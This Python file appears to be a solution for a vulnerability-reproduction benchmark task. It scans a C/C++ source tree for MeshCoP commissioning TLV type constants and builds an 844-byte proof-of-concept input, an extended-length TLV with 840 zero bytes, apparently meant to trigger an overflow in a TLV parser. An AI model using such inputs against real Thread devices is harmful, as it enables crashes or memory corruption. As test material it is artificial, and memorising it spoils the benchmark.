import os
import re
import tarfile
from typing import Dict, Iterable, Optional, Tuple


class Solution:
    def _iter_repo_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = (".h", ".hpp", ".c", ".cc", ".cpp")
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.endswith(exts):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                        if st.st_size <= 0 or st.st_size > 2_000_000:
                            continue
                        with open(path, "rb") as f:
                            yield path, f.read()
                    except OSError:
                        continue
            return

        if not tarfile.is_tarfile(src_path):
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lower = name.lower()
                    if not lower.endswith(exts):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _extract_constant_from_text(self, text: str, const_name: str) -> Optional[int]:
        m = re.search(r"\b" + re.escape(const_name) + r"\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b", text)
        if m:
            s = m.group(1)
            try:
                return int(s, 0)
            except ValueError:
                return None
        return None

    def _find_tlv_type(self, src_path: str) -> int:
        candidates = [
            ("kSteeringData", 8),
            ("kBorderAgentLocator", 9),
            ("kCommissionerId", 10),
            ("kCommissionerSessionId", 11),
        ]

        found: Dict[str, int] = {}
        target_names = {n for n, _ in candidates}

        for name, data in self._iter_repo_files(src_path):
            lowname = name.lower()
            if ("tlv" not in lowname) and ("meshcop" not in lowname) and ("commission" not in lowname):
                continue

            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                continue

            for const_name in list(target_names - found.keys()):
                if const_name not in txt:
                    continue
                val = self._extract_constant_from_text(txt, const_name)
                if val is not None:
                    found[const_name] = val & 0xFF

            if len(found) == len(target_names):
                break

        for const_name, fallback in candidates:
            if const_name in found:
                return found[const_name]
        return candidates[0][1]

    def solve(self, src_path: str) -> bytes:
        tlv_type = self._find_tlv_type(src_path)

        value_len = 840  # Total PoC length: 1(type)+1(0xff)+2(extlen)+840 = 844
        extlen = value_len.to_bytes(2, "big")
        return bytes([tlv_type & 0xFF, 0xFF]) + extlen + (b"\x00" * value_len)